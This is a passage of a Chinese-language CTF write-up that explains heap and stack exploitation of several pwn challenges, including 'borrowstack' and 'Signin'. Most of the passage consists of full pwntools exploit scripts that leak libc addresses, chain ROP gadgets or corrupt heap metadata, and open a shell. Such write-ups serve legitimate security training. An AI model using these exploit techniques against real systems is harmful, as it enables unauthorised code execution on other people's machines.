    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('3')
    sh.recvuntil('&gt; Oreo ID : ')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('4')
    sh.recvuntil('&gt; Oreo ID : ')
    sh.sendline(str(index))

if __name__ == "__main__":
    sh = get_sh()
    sh.recvuntil('&gt; Input your code please:')
    sh.sendline('OreOOrereOOreO'+'%14$p')
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('0')
    PIE_addr=get_address(sh,'We leak an addr : ','# Your Code is OreOOrereOOreO0x','n',True) - 0x202050
    log.success('PIE addr is '+str(hex(PIE_addr)))
    creat(sh,0x60,'Chunk_1',0x70,'Chunk_1')
    creat(sh,0x60,'Chunk_2',0x70,'Chunk_2')
    delete(sh,1)
    delete(sh,2)
    delete(sh,1)
    creat(sh,0x60,p64(0x202080+PIE_addr),0x50,'Chunk_1')
    creat(sh,0x60,'Chunk_2',0x50,'Chunk_2')
    creat(sh,0x60,'Chunk_1',0x50,'Chunk_1')
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('1')
    sh.recvuntil('&gt; O's length : ')
    sh.sendline(str(0x60))
    sh.recvuntil('&gt; O : ')
    sh.send(p64(0x70)*3+p64(0)*8+p64(0x2020E8+PIE_addr))
    sh.recvuntil('&gt; RE's length : ')
    sh.sendline(str(0x50))
    sh.recvuntil('&gt; RE : ')
    sh.sendline('Chunk_3')
    edit(sh,1,p64(0x2020E8+PIE_addr)+p64(interested.got['puts']+PIE_addr),'Anyvalue')
    show(sh,2)
    puts_addr=get_address(sh,'We get puts address is ','# oreo's O is ','n')
    libc_base=puts_addr-libc.symbols['puts']
    system_addr=libc_base+libc.symbols['system']
    binsh_addr =libc_base+libc.search('/bin/sh').next()
    edit(sh,1,p64(0x2020E8+PIE_addr)+p64(libc.symbols['__free_hook']+libc_base)+p64(binsh_addr),p64(binsh_addr))
    edit(sh,2,p64(system_addr),p64(system_addr))
    delete(sh,3)
    sh.interactive()
    sh.sendline('cat /flag')
    flag=sh.recvuntil('n').strip('n')
    log.success('The flag is '+flag)
    sh.close()

```



## 0x07 SecondDay_borrowstack

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-024835.png)

仅开启NX保护

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-033648.png)

本题很明显存在栈溢出，并且可以使用栈迁移技术完成利用。

但要注意，我们在BSS段构造`ROP Chain`时，需要在前端布置一段空区域，防止ROP链在执行时访问到非法内存。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

borrowstack=ELF('./borrowstack', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./borrowstack")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

if __name__ == "__main__":
    sh = get_sh()
    # get_gdb(sh)
    payload  = 'A' * 0x60 + p64(0x0000000000601080 + 0x28) + p64(0x0000000000400699)
    sh.recvuntil('elcome to Stack bank,Tell me what you want')
    sh.send(payload)
    payload  = 'x00' * 0x30
    payload += p64(0x0000000000400590) + p64(borrowstack.bss()+0x500)
    payload += p64(0x0000000000400703) + p64(borrowstack.got['__libc_start_main'])
    payload += p64(borrowstack.plt['puts'])
    payload += p64(0x0000000000400703) + p64(0)
    payload += p64(0x0000000000400701) + p64(0x0000000000601108) + p64(0x0000000000601108)
    payload += p64(borrowstack.plt['read'])
    sh.recvuntil('Done!You can check and use your borrow stack now!')
    # get_gdb(sh)
    sh.send(payload)
    libc_base = get_address(sh,'We get libc address is ','x0A','x0A',-libc.symbols['__libc_start_main'])
    payload  = p64(0x00000000004004c9)* 0x50
    payload += p64(0x0000000000400703) + p64(libc_base + libc.search('/bin/sh').next())
    payload += p64(libc_base + libc.symbols['system'])
    sh.send(payload)
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```



## 0x08 ThirdDay_Signin

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-102916.png)

仅开启Canary和NX。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

漏洞十分明显，del函数free后指针未置零，存在UAF漏洞，但采用了辅助标志变量，封堵了double_free漏洞。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-103034.png)

edit函数只能调用一次，cnt初值为0，自减后即变为-1，不再满足条件。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-103202.png)

注意，我们发现在调用backdoor函数时，程序会调用一次`calloc`，而`calloc`的特性会导致直接从`fastbin`中取出Chunk，而在libc的源码中可以看到

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-24-021351.png)

此处会取出fastbin的所有剩余Chunk并将其链入tcache bin。在链入时，会向其fd域写入链表的相关信息，并且发现，在链入过程中，**不会对该chunk做size合法性检查**（此处`tache_put`函数已经明确注明，index的合法性由主调函数确认）！

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-24-021834.png)

那么，若我们在fastbin中事先链入一个非法的chunk位于`ptr-0x10`的位置，将会在置入tcache bin时使得ptr被填入chunk地址。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

signin=ELF('./signin', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./signin")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

def creat(sh,index):
    sh.recvuntil('your choice?')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(index))

def edit(sh,index,value):
    sh.recvuntil('your choice?')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(index))
    sh.sendline(value)

def delete(sh,index):
    sh.recvuntil('your choice?')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(index))

if __name__ == "__main__":
    sh = get_sh()

    for i in range(7):
        creat(sh,i)
    for i in range(7,9):
        creat(sh,i)

    for i in range(7):
        delete(sh,i)
    for i in range(7,9):
        delete(sh,i)

    creat(sh,9)
    edit(sh,8,p64(0x4040B0))
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

### <a class="reference-link" name="Glibc2.29%E4%B8%8B%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"></a>Glibc2.29下的非预期解

在glibc-2.29下，chunk在free时加入了以下代码：

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-24-023301.png)

而key的位置，恰好是cnt的位置，于是可以做到多次edit完成利用。

在运行以下代码后，可以看到，`cnt`已经变成了`-1`。

```
creat(sh,0)
delete(sh,0)
edit(sh,0,p64(0x4040B0))
```

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-24-023632.png)

接下来运行以下代码后，可以看到，`cnt`已经被重置为了`0`。

```
creat(sh,1)
creat(sh,2)
```

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-24-023907.png)

### <a class="reference-link" name="Final%20Exploit%E2%80%94%E2%80%94%E9%9D%9E%E9%A2%84%E6%9C%9F"></a>Final Exploit——非预期

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

signin=ELF('./signin', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./signin")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

def creat(sh,index):
    sh.recvuntil('your choice?')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(index))

def edit(sh,index,value):
    sh.recvuntil('your choice?')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(index))
    sh.sendline(value)

def delete(sh,index):
    sh.recvuntil('your choice?')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(index))

if __name__ == "__main__":
    sh = get_sh()
    creat(sh,0)
    delete(sh,0)
    edit(sh,0,p64(0x4040B0))
    creat(sh,1)
    creat(sh,2)
    edit(sh,2,p64(0)*2+p64(1))
    sh.recvuntil('your choice?')
    sh.sendline('6')
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```



## 0x9 后记

剩余的两道C++ PWN将在专门的文章中作为例题总结。



## 0x10 参考链接

[canary analysis – zet](http://www.hardenedlinux.org/2016/11/27/canary.html)

[为什么/lib32/libc.so.6中有两个“fopen”符号？](https://stackoom.com/question/cQ06/%E4%B8%BA%E4%BB%80%E4%B9%88-lib-libc-so-%E4%B8%AD%E6%9C%89%E4%B8%A4%E4%B8%AA-fopen-%E7%AC%A6%E5%8F%B7)

[Top chunk劫持：House of force攻击](https://www.anquanke.com/post/id/175630)
